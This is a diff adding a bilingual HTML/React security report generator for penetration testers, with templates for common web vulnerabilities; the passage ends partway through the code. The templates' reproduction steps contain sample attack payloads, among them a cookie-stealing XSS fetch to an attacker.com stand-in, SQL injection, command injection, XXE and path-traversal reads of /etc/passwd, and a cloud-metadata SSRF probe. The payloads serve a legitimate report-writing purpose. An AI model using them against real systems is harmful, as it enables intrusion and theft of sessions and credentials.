@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Generador de Reportes de Seguridad / Security Report Generator</title>
+    
+    <!-- React & ReactDOM -->
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    
+    <!-- Babel for JSX -->
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Google Fonts: Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['ui-monospace', 'SFMono-Regular', 'Menlo', 'Monaco', 'Consolas', 'monospace'],
+                    },
+                    colors: {
+                        brand: {
+                            50: '#eff6ff',
+                            100: '#dbeafe',
+                            500: '#3b82f6',
+                            600: '#2563eb',
+                            900: '#1e3a8a',
+                            950: '#0b0f19',
+                        },
+                        severity: {
+                            crit: '#dc2626',
+                            high: '#f97316',
+                            med: '#eab308',
+                            low: '#3b82f6',
+                            info: '#6b7280',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <style>
+        @media print {
+            body { 
+                background-color: white !important; 
+                -webkit-print-color-adjust: exact !important; 
+                print-color-adjust: exact !important;
+            }
+            .no-print { display: none !important; }
+            .print-only { display: block !important; }
+            .page-break { page-break-before: always; }
+            .avoid-break { page-break-inside: avoid; }
+            #root { padding: 0; margin: 0; }
+            .preview-container { 
+                box-shadow: none !important; 
+                max-width: 100% !important; 
+                width: 100% !important;
+                margin: 0 !important; 
+                padding: 0 !important; 
+            }
+            .print-bg-gray { background-color: #f9fafb !important; }
+            .print-bg-dark { background-color: #111827 !important; color: #34d399 !important; }
+            .print-border { border: 1px solid #e5e7eb !important; }
+        }
+        @media screen { .print-only { display: none !important; } }
+        body { background-color: #f3f4f6; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
+        .paper-shadow { box-shadow: 0 0 15px rgba(0,0,0,0.05), 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); }
+    </style>
+</head>
+<body class="text-gray-800 antialiased font-sans">
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect, useMemo } = React;
+
+        // --- SVGs ---
+        const Icons = {
+            Shield: () => <svg className="w-16 h-16 text-brand-900" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="M12 8v4"></path><path d="M12 16h.01"></path></svg>,
+            Target: () => <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="6"></circle><circle cx="12" cy="12" r="2"></circle></svg>,
+            Code: () => <svg className="w-4 h-4 mr-2 text-gray-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>,
+            Alert: () => <svg className="w-4 h-4 mr-2 text-severity-crit" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>,
+            Check: () => <svg className="w-4 h-4 mr-2 text-green-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>,
+            Book: () => <svg className="w-4 h-4 inline mr-1 text-gray-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>,
+            Activity: () => <svg className="w-4 h-4 inline mr-1 text-gray-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>,
+            Globe: () => <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+        };
+
+        // --- DICCIONARIOS DE UI ---
+        const UI = {
+            es: {
+                appTitle: "Automatic Report",
+                editPanel: "Panel de Edición",
+                preview: "Previsualizar",
+                generatePdf: "Generar PDF",
+                newFinding: "Registrar Nuevo Hallazgo",
+                newFindingDesc: "Completa los detalles de la vulnerabilidad descubierta.",
+                quickTemplate: "Plantilla Rápida (Auto-completar)",
+                customOther: "-- Redactar Manualmente (Custom / Other) --",
+                specTitle: "Título Específico *",
+                severity: "Criticidad *",
+                techDesc: "Descripción Técnica *",
+                cvss: "Puntuación CVSS",
+                poc: "Pasos para Reproducir (PoC)",
+                impact: "Impacto Real",
+                remediation: "Solución Recomendada",
+                reference: "Referencia (OWASP/MITRE)",
+                cve: "CVE (Opcional)",
+                images: "Evidencias Gráficas",
+                uploadImage: "Subir Imagen",
+                noImages: "No hay evidencias adjuntas. Soporta múltiples imágenes.",
+                registerBtn: "Registrar Hallazgo al Reporte",
+                auditData: "Datos de la Auditoría",
+                docTitle: "Título del Documento",
+                clientComp: "Empresa Cliente",
+                targetAsset: "Activo u Objetivo Evaluado",
+                auditComp: "Empresa Auditora",
+                auditorName: "Nombre del Auditor(es)",
+                classification: "Clasificación",
+                version: "Versión",
+                date: "Fecha",
+                addedFindings: "Vulnerabilidades Añadidas",
+                findingsCount: "Hallazgos",
+                noFindings: "No hay vulnerabilidades registradas aún.",
+                execSummary: "Resumen Ejecutivo",
+                prepFor: "Preparado Para",
+                prepBy: "Preparado Por",
+                globalRisk: "Riesgo Global Actual",
+                summaryText1: "Durante la evaluación de seguridad realizada para",
+                summaryText2: ", se identificaron un total de",
+                summaryText3: "vulnerabilidades o áreas de mejora en el activo",
+                summaryText4: ". El nivel de exposición de riesgo global actual de la infraestructura se clasifica como",
+                summaryText5: ". Se recomienda la priorización inmediata de la mitigación de los hallazgos críticos y altos para prevenir compromisos de integridad, confidencialidad o disponibilidad.",
+                distTitle: "Distribución de Vulnerabilidades",
+                techDetails: "Detalle Técnico de Hallazgos",
+                noFindingsPrint: "No hay hallazgos registrados para mostrar.",
+                genBy: "Generado por Automatic Report Platform",
+                reportVer: "Reporte Versión",
+                classifications: ['Público', 'Uso Interno', 'Confidencial', 'Estrictamente Confidencial']
+            },
+            en: {
+                appTitle: "Automatic Report",
+                editPanel: "Edit Panel",
+                preview: "Preview",
+                generatePdf: "Generate PDF",
+                newFinding: "Register New Finding",
+                newFindingDesc: "Fill in the details of the discovered vulnerability.",
+                quickTemplate: "Quick Template (Auto-fill)",
+                customOther: "-- Write Manually (Custom / Other) --",
+                specTitle: "Specific Title *",
+                severity: "Severity *",
+                techDesc: "Technical Description *",
+                cvss: "CVSS Score",
+                poc: "Steps to Reproduce (PoC)",
+                impact: "Real Impact",
+                remediation: "Recommended Solution",
+                reference: "Reference (OWASP/MITRE)",
+                cve: "CVE (Optional)",
+                images: "Graphic Evidence",
+                uploadImage: "Upload Image",
+                noImages: "No evidence attached. Supports multiple images.",
+                registerBtn: "Register Finding to Report",
+                auditData: "Audit Data",
+                docTitle: "Document Title",
+                clientComp: "Client Company",
+                targetAsset: "Target Asset",
+                auditComp: "Auditor Company",
+                auditorName: "Auditor Name(s)",
+                classification: "Classification",
+                version: "Version",
+                date: "Date",
+                addedFindings: "Added Findings",
+                findingsCount: "Findings",
+                noFindings: "No vulnerabilities registered yet.",
+                execSummary: "Executive Summary",
+                prepFor: "Prepared For",
+                prepBy: "Prepared By",
+                globalRisk: "Current Global Risk",
+                summaryText1: "During the security assessment performed for",
+                summaryText2: ", a total of",
+                summaryText3: "vulnerabilities or areas of improvement were identified in the asset",
+                summaryText4: ". The current overall risk exposure level of the infrastructure is classified as",
+                summaryText5: ". Immediate prioritization of the mitigation of critical and high findings is recommended to prevent compromises of integrity, confidentiality, or availability.",
+                distTitle: "Vulnerabilities Distribution",
+                techDetails: "Technical Details of Findings",
+                noFindingsPrint: "No findings registered to display.",
+                genBy: "Generated by Automatic Report Platform",
+                reportVer: "Report Version",
+                classifications: ['Public', 'Internal Use', 'Confidential', 'Strictly Confidential']
+            }
+        };
+
+        const severities = {
+            crit: { es: 'Crítica', en: 'Critical' },
+            high: { es: 'Alta', en: 'High' },
+            med:  { es: 'Media', en: 'Medium' },
+            low:  { es: 'Baja', en: 'Low' },
+            info: { es: 'Informativa', en: 'Informational' }
+        };
+
+        // --- PLANTILLAS BILINGÜES ---
+        const templates = {
+            sqli: {
+                key: 'sqli',
+                severity: "crit",
+                cvss: "9.8",
+                reference: "OWASP Top 10: A03:2021-Injection / CWE-89",
+                es: {
+                    title: "Inyección SQL (SQLi)",
+                    description: "La aplicación no neutraliza adecuadamente los elementos especiales dentro de los comandos SQL, lo que permite a un atacante inyectar consultas SQL arbitrarias. Esto ocurre cuando la entrada del usuario se concatena dinámicamente sin parametrización.",
+                    poc: "1. Identificar el parámetro vulnerable.\n2. Interceptar la petición HTTP.\n3. Inyectar el payload: ' OR '1'='1 --\n4. Observar el bypass de autenticación o la extracción de datos.",
+                    impact: "Pérdida completa de la confidencialidad, integridad y disponibilidad de los datos. Potencial de Ejecución Remota de Código (RCE) en el servidor de base de datos.",
+                    remediation: "1. Utilizar consultas parametrizadas (Prepared Statements) consistentemente.\n2. Implementar un marco ORM seguro.\n3. Aplicar validación de entrada estricta (allow-listing).",
+                },
+                en: {
+                    title: "SQL Injection (SQLi)",
+                    description: "The application fails to properly neutralize special elements within SQL commands, allowing an attacker to inject arbitrary SQL queries. This occurs when user-supplied input is dynamically concatenated without parameterization.",
+                    poc: "1. Identify the vulnerable parameter.\n2. Intercept the HTTP request.\n3. Inject the payload: ' OR '1'='1 --\n4. Observe authentication bypass or unauthorized data extraction.",
+                    impact: "Complete loss of data confidentiality, integrity, and availability. Potential for Remote Code Execution (RCE) on the underlying database server.",
+                    remediation: "1. Use parameterized queries (Prepared Statements) consistently.\n2. Implement a safe Object-Relational Mapping (ORM) framework.\n3. Apply strict input validation (allow-listing).",
+                }
+            },
+            xss_r: {
+                key: 'xss_r',
+                severity: "high",
+                cvss: "6.1",
+                reference: "OWASP Top 10: A03:2021-Injection / CWE-79",
+                es: {
+                    title: "Cross-Site Scripting (XSS) Reflejado",
+                    description: "La aplicación incluye datos no confiables en una página web sin validación adecuada. Un atacante puede enviar un enlace malicioso a una víctima y el script se ejecutará en su navegador.",
+                    poc: "1. Construir la URL maliciosa: https://ejemplo.com/?q=<script>alert(document.domain)<\/script>\n2. Enviar a la víctima.\n3. El navegador de la víctima ejecuta el script al hacer clic.",
+                    impact: "Robo de cookies de sesión, secuestro de cuentas, redirección a sitios maliciosos o ejecución de acciones en nombre del usuario afectado.",
+                    remediation: "Implementar codificación de salida (Output Encoding) contextual antes de renderizar datos. Utilizar cabeceras de seguridad como Content-Security-Policy (CSP).",
+                },
+                en: {
+                    title: "Reflected Cross-Site Scripting (XSS)",
+                    description: "The application includes untrusted data in a web page without proper validation or escaping. An attacker can send a malicious link to a victim, executing JavaScript in their browser.",
+                    poc: "1. Construct the malicious URL: https://example.com/?q=<script>alert(document.domain)<\/script>\n2. Send the URL to the victim.\n3. When the victim clicks, their browser executes the script.",
+                    impact: "Theft of session cookies, account hijacking, redirection to malicious sites, or execution of unauthorized actions on behalf of the user.",
+                    remediation: "Implement contextual Output Encoding before rendering user-controlled data. Use security headers such as Content-Security-Policy (CSP).",
+                }
+            },
+            xss_s: {
+                key: 'xss_s',
+                severity: "high",
+                cvss: "7.5",
+                reference: "OWASP Top 10: A03:2021-Injection / CWE-79",
+                es: {
+                    title: "Cross-Site Scripting (XSS) Almacenado",
+                    description: "La aplicación almacena entrada no sanitizada en el servidor. Cuando otros usuarios solicitan los datos, el script malicioso se ejecuta de forma persistente.",
+                    poc: "1. Identificar un campo guardado (ej. comentarios).\n2. Inyectar: <script>fetch('http://atacante.com/log?c='+document.cookie)<\/script>\n3. Guardar. El payload se ejecutará para cualquier visitante.",
+                    impact: "Compromiso persistente de cuentas de usuario, robo continuo de sesiones y distribución de malware a los visitantes.",
+                    remediation: "Implementar validación de entrada y aplicar Output Encoding estricto al renderizar en el navegador.",
+                },
+                en: {
+                    title: "Stored Cross-Site Scripting (XSS)",
+                    description: "The application stores unsanitized user input on the server. When other users request the stored data, the malicious script executes persistently.",
+                    poc: "1. Identify an input field that is saved and displayed (e.g., comments).\n2. Inject payload: <script>fetch('http://attacker.com/log?c='+document.cookie)<\/script>\n3. Save. The payload executes for anyone visiting the page.",
+                    impact: "Persistent compromise of user accounts, continuous session theft, and malware distribution to application visitors.",
+                    remediation: "Implement input validation and apply strict Output Encoding when stored data is rendered in the browser.",
+                }
+            },
+            idor: {
+                key: 'idor',
+                severity: "high",
+                cvss: "7.5",
+                reference: "OWASP Top 10: A01:2021-Broken Access Control / CWE-639",
+                es: {
+                    title: "Insecure Direct Object Reference (IDOR)",
+                    description: "La aplicación expone referencias directas a objetos internos y no valida adecuadamente los permisos del usuario para acceder a dichos recursos.",
+                    poc: "1. Iniciar sesión con el Usuario A.\n2. Acceder a un recurso propio (ej. /api/facturas/1001).\n3. Cambiar el ID al recurso del Usuario B (ej. /api/facturas/1002).\n4. Confirmar que devuelve datos ajenos.",
+                    impact: "Acceso no autorizado a datos sensibles de otros usuarios, modificaciones horizontales de privilegios y fuga de información.",
+                    remediation: "Implementar controles de acceso a nivel de objeto. Verificar en el backend que el usuario actual posee permisos sobre el recurso solicitado.",
+                },
+                en: {
+                    title: "Insecure Direct Object Reference (IDOR)",
+                    description: "The application exposes direct references to internal objects and does not properly validate user permissions to access those objects.",
+                    poc: "1. Log in as User A.\n2. Access an owned resource (e.g., /api/invoices/1001).\n3. Modify the ID to a resource belonging to User B (e.g., /api/invoices/1002).\n4. Confirm it returns unauthorized data.",
+                    impact: "Unauthorized access to sensitive data of other users, horizontal privilege escalation, and information disclosure.",
+                    remediation: "Implement object-level access controls. Always verify on the backend that the current user is authorized to access the requested resource.",
+                }
+            },
+            ssrf: {
+                key: 'ssrf',
+                severity: "crit",
+                cvss: "8.6",
+                reference: "OWASP Top 10: A10:2021-Server-Side Request Forgery",
+                es: {
+                    title: "Server-Side Request Forgery (SSRF)",
+                    description: "La aplicación permite obligar al servidor a realizar solicitudes HTTP arbitrarias a servicios internos o externos.",
+                    poc: "1. Identificar funcionalidad de carga por URL.\n2. Apuntar a servicio interno: url=http://169.254.169.254/latest/meta-data/\n3. Observar la respuesta con credenciales internas.",
+                    impact: "Exposición de servicios internos, escaneo de la red perimetral, robo de credenciales en la nube o ejecución de comandos.",
+                    remediation: "Validar estrictamente las URLs mediante allow-list. Bloquear peticiones a direcciones IP internas o de loopback.",
+                },
+                en: {
+                    title: "Server-Side Request Forgery (SSRF)",
+                    description: "The application allows an attacker to force the server to make arbitrary HTTP requests to internal or external services.",
+                    poc: "1. Identify URL loading functionality.\n2. Send request pointing to cloud internal service: url=http://169.254.169.254/latest/meta-data/\n3. Observe the response leaking internal credentials.",
+                    impact: "Exposure of internal services, perimeter network scanning, cloud credential theft, or remote code execution.",
+                    remediation: "Strictly validate incoming URLs using an allow-list. Explicitly block requests to internal or loopback IP addresses.",
+                }
+            },
+            csrf: {
+                key: 'csrf',
+                severity: "med",
+                cvss: "6.5",
+                reference: "CWE-352: Cross-Site Request Forgery",
+                es: {
+                    title: "Cross-Site Request Forgery (CSRF)",
+                    description: "Un atacante obliga al navegador de un usuario a ejecutar acciones no deseadas en una web donde está autenticado.",
+                    poc: "1. Crear HTML malicioso con un formulario oculto apuntando a una acción del sitio.\n2. Configurar auto-envío (onload).\n3. Engañar a la víctima para que visite la página.",
+                    impact: "Ejecución de acciones no autorizadas en nombre de la víctima, como cambios de contraseñas o transferencias.",
+                    remediation: "Implementar tokens anti-CSRF únicos por sesión en solicitudes de cambio de estado. Usar atributo SameSite en cookies.",
+                },
+                en: {
+                    title: "Cross-Site Request Forgery (CSRF)",
+                    description: "An attacker forces an authenticated user's browser to execute unwanted actions on a trusted web application.",
+                    poc: "1. Create a malicious HTML page with a hidden form pointing to a platform action.\n2. Set the form to auto-submit (onload).\n3. Trick the authenticated victim into visiting the page.",
+                    impact: "Execution of unauthorized actions on behalf of the victim, such as configuration changes, passwords resets, or bank transfers.",
+                    remediation: "Implement unique anti-CSRF tokens per session on all state-changing requests. Use SameSite attribute for cookies.",
+                }
+            },
+            xxe: {
+                key: 'xxe',
+                severity: "high",
+                cvss: "7.5",
+                reference: "OWASP Top 10: A05:2021-Security Misconfiguration",
+                es: {
+                    title: "XML External Entity (XXE) Injection",
+                    description: "La aplicación procesa entradas XML sin desactivar la resolución de entidades externas, permitiendo la lectura de archivos o SSRF.",
+                    poc: "1. Interceptar solicitud que acepta XML.\n2. Inyectar: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n3. Usar &xxe; en un campo reflejado.",
+                    impact: "Lectura de archivos confidenciales del servidor, ataques SSRF a redes internas, o denegación de servicio.",
+                    remediation: "Deshabilitar completamente el procesamiento de entidades externas (XXE) y DTDs en el parser XML.",
+                },
+                en: {
+                    title: "XML External Entity (XXE) Injection",
+                    description: "The application processes XML input without disabling external entity resolution, allowing local file reads or SSRF.",
+                    poc: "1. Intercept a request accepting XML.\n2. Inject: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n3. Use the &xxe; entity within a reflected XML field.",
+                    impact: "Reading of confidential server files, SSRF attacks to internal networks, or Denial of Service (Billion Laughs).",
+                    remediation: "Completely disable the processing of external entities (XXE) and Document Type Definitions (DTDs) in the XML parser.",
+                }
+            },
+            rce: {
+                key: 'rce',
+                severity: "crit",
+                cvss: "10.0",
+                reference: "CWE-78: OS Command Injection",
+                es: {
+                    title: "Remote Code Execution (RCE)",
+                    description: "La aplicación permite la ejecución arbitraria de comandos a nivel del sistema operativo debido a una inyección de comandos.",
+                    poc: "1. Identificar punto de entrada que procesa comandos.\n2. Concatenar payload: 8.8.8.8 ; id\n3. Observar el resultado del comando en la respuesta.",
+                    impact: "Compromiso total del servidor. El atacante obtiene control completo sobre la infraestructura.",
+                    remediation: "Evitar llamar a comandos del sistema directamente. Utilizar APIs seguras y técnicas de sandboxing.",
+                },
+                en: {
+                    title: "Remote Code Execution (RCE)",
+                    description: "The application allows arbitrary execution of OS-level commands due to a command injection vulnerability.",
+                    poc: "1. Identify an entry point that processes system commands.\n2. Concatenate the payload: 8.8.8.8 ; id\n3. Observe the result of the injected command returned by the server.",
+                    impact: "Total server compromise. The attacker gains full control over the infrastructure.",
+                    remediation: "Avoid calling system commands directly from the application. Use secure APIs and sandboxing techniques.",
+                }
+            },
+            lfi: {
+                key: 'lfi',
+                severity: "high",
+                cvss: "7.5",
+                reference: "CWE-22: Path Traversal",
+                es: {
+                    title: "Local File Inclusion (LFI)",
+                    description: "La aplicación permite a un atacante incluir y visualizar archivos locales del servidor debido a nula validación de rutas.",
+                    poc: "1. Identificar parámetro vulnerable (ej. ?page=about).\n2. Inyectar saltos de directorio: ?page=../../../../../../etc/passwd\n3. Observar el contenido del archivo interno.",
+                    impact: "Exposición de código fuente, credenciales, archivos de configuración, y potencial escalada a RCE.",
+                    remediation: "No permitir a los usuarios controlar rutas de archivos. Usar un mapeo indirecto (allow-list).",
+                },
+                en: {
+                    title: "Local File Inclusion (LFI)",
+                    description: "The application allows an attacker to include and view local server files due to poor path validation.",
+                    poc: "1. Identify a vulnerable parameter (e.g., ?page=about).\n2. Inject directory traversal sequences: ?page=../../../../../../etc/passwd\n3. Observe the internal file content rendered.",
+                    impact: "Exposure of sensitive information, source code, configuration files, and potential escalation to RCE.",
+                    remediation: "Do not allow users to control file paths. Use an indirect mapping (allow-list of identifiers).",
+                }
+            },
+            cors: {
+                key: 'cors',
+                severity: "med",
+                cvss: "5.4",
+                reference: "OWASP Top 10: A05:2021-Security Misconfiguration",
+                es: {
+                    title: "CORS Misconfiguration",
+                    description: "La política CORS es excesivamente permisiva, permitiendo que orígenes arbitrarios accedan a recursos de usuarios.",
+                    poc: "1. Enviar petición con cabecera 'Origin: https://atacante.com'.\n2. Confirmar que el servidor responde con Access-Control-Allow-Origin reflejado y Allow-Credentials: true.",
+                    impact: "Robo de datos sensibles de la sesión desde dominios controlados por atacantes.",
+                    remediation: "Configurar CORS de forma estricta. Implementar una lista blanca (allow-list) explícita de orígenes de confianza.",
+                },
+                en: {
+                    title: "CORS Misconfiguration",
+                    description: "The Cross-Origin Resource Sharing (CORS) policy is overly permissive, allowing arbitrary origins to access user resources.",
+                    poc: "1. Send a request with 'Origin: https://attacker.com'.\n2. Confirm the server responds with Access-Control-Allow-Origin reflecting the domain and Allow-Credentials: true.",
+                    impact: "Theft of sensitive session data or execution of cross-origin actions from attacker-controlled domains.",
+                    remediation: "Configure CORS headers strictly. Implement an explicit allow-list of trusted origins.",
+                }
+            },
+            broken_auth: {
+                key: 'broken_auth',
+                severity: "crit",
+                cvss: "8.1",
+                reference: "OWASP Top 10: A07:2021-Identification and Authentication Failures",
+                es: {
+                    title: "Autenticación Rota (Broken Auth)",
+                    description: "La gestión de sesiones se implementa incorrectamente, permitiendo a los atacantes comprometer contraseñas o tokens.",
+                    poc: "1. Interceptar el inicio de sesión.\n2. Realizar ataques de fuerza bruta debido a la ausencia de rate limiting.\n3. Acceder exitosamente.",
+                    impact: "Adquisición de cuentas de usuario, robo de identidad e infiltración de sistemas.",
+                    remediation: "Implementar autenticación multifactor (MFA), políticas de contraseñas robustas y rate limiting.",
+                },
+                en: {
+                    title: "Broken Authentication",
+                    description: "Session management is implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens.",
+                    poc: "1. Intercept the login process.\n2. Perform brute-force/credential stuffing attacks due to lack of rate limiting.\n3. Access successfully with stolen credentials.",
+                    impact: "Takeover of user accounts, identity theft, and system infiltration.",
+                    remediation: "Implement multi-factor authentication (MFA), robust password policies, and limit failed login attempts.",
+                }
+            },
+            ssti: {
+                key: 'ssti',
+                severity: "crit",
+                cvss: "9.8",
+                reference: "CWE-1336: Improper Neutralization Used in a Template Engine",
+                es: {
+                    title: "Server-Side Template Injection (SSTI)",
+                    description: "El atacante inyecta sintaxis de plantillas (templates) que se ejecuta en el servidor.",
+                    poc: "1. Identificar punto reflejado.\n2. Inyectar payload: {{7*7}}.\n3. Si devuelve '49', intentar RCE mediante librerías nativas del template.",
+                    impact: "Ejecución Remota de Código (RCE) y compromiso total del servidor.",
+                    remediation: "No renderizar plantillas con entrada de usuario. Usar entornos restrictivos (sandboxes).",
+                },
+                en: {
+                    title: "Server-Side Template Injection (SSTI)",
+                    description: "The attacker injects native template syntax that is executed on the server-side.",
+                    poc: "1. Identify a reflected input point.\n2. Inject template payload: {{7*7}}.\n3. If it returns '49', attempt RCE using template native libraries.",
+                    impact: "Remote Code Execution (RCE) and total server compromise.",
+                    remediation: "Do not render templates using user-provided input. If necessary, use restrictive sandboxes.",
+                }
+            },
+            api_exposure: {
+                key: 'api_exposure',
+                severity: "high",
+                cvss: "7.5",
+                reference: "CWE-798: Use of Hard-coded Credentials",
+                es: {
+                    title: "Exposición de Claves API",
+                    description: "Tokens o contraseñas se encuentran hardcoded en el frontend JavaScript o en repositorios públicos.",
+                    poc: "1. Inspeccionar archivos .js descargados.\n2. Buscar texto como: const AWS_KEY = 'AKIA...'.\n3. Autenticarse en el servicio externo.",
+                    impact: "Acceso a servicios en la nube facturables y robo de datos de la empresa.",
+                    remediation: "Almacenar claves sensibles únicamente en el servidor usando variables de entorno o Secret Managers.",
+                },
+                en: {
+                    title: "API Key Exposure",
+                    description: "Private API keys, tokens, or passwords are hardcoded in frontend JavaScript or exposed in public repositories.",
+                    poc: "1. Inspect downloaded .js files.\n2. Find cleartext like: const AWS_KEY = 'AKIA...'.\n3. Authenticate against the external service.",
+                    impact: "Unauthorized access to billable cloud services, data theft, and infrastructure compromise.",
+                    remediation: "Sensitive keys must be stored only on the server using environment variables or Secret Managers.",
+                }
+            }
+        };
+
+        const initialFindingState = {
+            id: '',
+            templateKey: 'custom',
+            title: '',
+            severity: 'med', // Internal key
+            description: '',
+            cvss: '',
+            poc: '',
+            impact: '',
+            remediation: '',
+            reference: '',
+            cve: '',
+            images: []
+        };
+
+        const App = () => {
+            const [lang, setLang] = useState('es');
+            const [activeTab, setActiveTab] = useState('editor');
+            const t = UI[lang];
+            
+            const [auditData, setAuditData] = useState({
+                documentTitle: lang === 'es' ? 'Reporte Técnico de Vulnerabilidades' : 'Technical Vulnerability Report',
+                clientCompany: 'Empresa Cliente S.A.',
+                targetAsset: 'Aplicación Principal',
+                auditorCompany: 'Empresa Auditora LLC',
+                auditorName: 'Juan Pérez',
+                classification: '1', // index of classifications array: 0, 1, 2, 3
+                version: '1.0',
+                date: new Date().toISOString().split('T')[0]
+            });
+
+            // Initialize with SQLi template based on current lang
+            const initTpl = templates['sqli'];
+            const [findings, setFindings] = useState([{
+                id: 'initial-demo',
+                templateKey: 'sqli',
+                severity: initTpl.severity,
+                cvss: initTpl.cvss,
+                reference: initTpl.reference,
+                cve: '',
+                images: [],
+                title: initTpl[lang].title,
+                description: initTpl[lang].description,
+                poc: initTpl[lang].poc,
+                impact: initTpl[lang].impact,
+                remediation: initTpl[lang].remediation
+            }]);
+            
+            const [currentFinding, setCurrentFinding] = useState(initialFindingState);
+
+            // Change App language
+            const toggleLanguage = () => {
+                setLang(prev => prev === 'es' ? 'en' : 'es');
+            };
+
+            // Dynamic updates when language changes
+            useEffect(() => {
+                // Update default document title if untouched
+                if (auditData.documentTitle === UI[lang === 'es' ? 'en' : 'es'].docTitle || auditData.documentTitle === 'Reporte Técnico de Vulnerabilidades' || auditData.documentTitle === 'Technical Vulnerability Report') {
+                    setAuditData(prev => ({...prev, documentTitle: UI[lang].docTitle}));
+                }
+
+                // If currently editing a template, swap its language in the form
+                if (currentFinding.templateKey !== 'custom' && templates[currentFinding.templateKey]) {
+                    const tpl = templates[currentFinding.templateKey];
+                    setCurrentFinding(prev => ({
+                        ...prev,
+                        title: tpl[lang].title,
+                        description: tpl[lang].description,
+                        poc: tpl[lang].poc,
+                        impact: tpl[lang].impact,
+                        remediation: tpl[lang].remediation
+                    }));
+                }
+
+                // Translate all existing added findings based on their original template Key
+                setFindings(prevFindings => prevFindings.map(f => {
+                    if (f.templateKey !== 'custom' && templates[f.templateKey]) {
+                        const tpl = templates[f.templateKey];
+                        return {
+                            ...f,
+                            title: tpl[lang].title,
+                            description: tpl[lang].description,
+                            poc: tpl[lang].poc,
+                            impact: tpl[lang].impact,
+                            remediation: tpl[lang].remediation
+                        };
+                    }
+                    return f; // Custom findings remain unchanged
+                }));
+            }, [lang]);
+
+            const handleAuditChange = (e) => {
+                const { name, value } = e.target;
+                setAuditData(prev => ({ ...prev, [name]: value }));
+            };
+
+            const handleFindingChange = (e) => {
+                const { name, value } = e.target;
+                setCurrentFinding(prev => ({ ...prev, [name]: value }));
+            };
+
+            const handleTemplateChange = (e) => {
+                const key = e.target.value;
+                if (templates[key]) {
+                    const tpl = templates[key];
+                    setCurrentFinding(prev => ({ 
+                        ...prev, 
+                        templateKey: key,
+                        severity: tpl.severity,
+                        cvss: tpl.cvss,
+                        reference: tpl.reference,
+                        title: tpl[lang].title,
+                        description: tpl[lang].description,
+                        poc: tpl[lang].poc,
+                        impact: tpl[lang].impact,
+                        remediation: tpl[lang].remediation
+                    }));
+                } else {
+                    setCurrentFinding(prev => ({ ...initialFindingState, templateKey: 'custom', images: prev.images }));
+                }
+            };
+
+            const handleImageUpload = (e) => {
+                const files = Array.from(e.target.files);
+                const newImages = files.map(file => URL.createObjectURL(file));
+                setCurrentFinding(prev => ({ ...prev, images: [...prev.images, ...newImages] }));
+            };
+
+            const removeImage = (indexToRemove) => {
+                setCurrentFinding(prev => ({ ...prev, images: prev.images.filter((_, index) => index !== indexToRemove) }));
+            };
+
+            const addFinding = (e) => {
+                e.preventDefault();
+                if (!currentFinding.title || !currentFinding.description) {
+                    alert('Please fill out Title and Description.');
+                    return;
+                }
+                const newFinding = { ...currentFinding, id: Date.now().toString() };
+                setFindings([...findings, newFinding]);
+                setCurrentFinding(initialFindingState);
+            };
+
+            const removeFinding = (idToRemove) => {
+                setFindings(findings.filter(f => f.id !== idToRemove));
+            };
+
+            const triggerPrint = () => {
